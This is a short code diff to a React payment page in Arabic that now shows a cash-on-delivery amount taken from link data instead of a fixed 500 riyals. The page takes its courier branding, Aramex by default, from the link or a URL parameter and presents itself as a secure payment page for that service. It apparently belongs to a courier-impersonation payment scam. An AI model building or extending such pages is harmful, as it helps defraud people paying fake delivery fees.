@@ -19,6 +19,8 @@ const PaymentDetails = () => {
   const serviceName = linkData?.payload?.service_name || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const branding = getServiceBranding(serviceName);
   const shippingInfo = linkData?.payload as any;
+  const amount = shippingInfo?.cod_amount || 500;
+  const formattedAmount = `${amount} ر.س`;
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -37,7 +39,7 @@ const PaymentDetails = () => {
     <>
       <PaymentMetaTags 
         serviceName={serviceName}
-        amount="500 ر.س"
+        amount={formattedAmount}
         title={`الدفع - ${serviceName}`}
         description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
       />
@@ -147,7 +149,7 @@ const PaymentDetails = () => {
                 >
                   <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
                   <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
-                    500 ر.س
+                    {formattedAmount}
                   </span>
                 </div>
               </div>
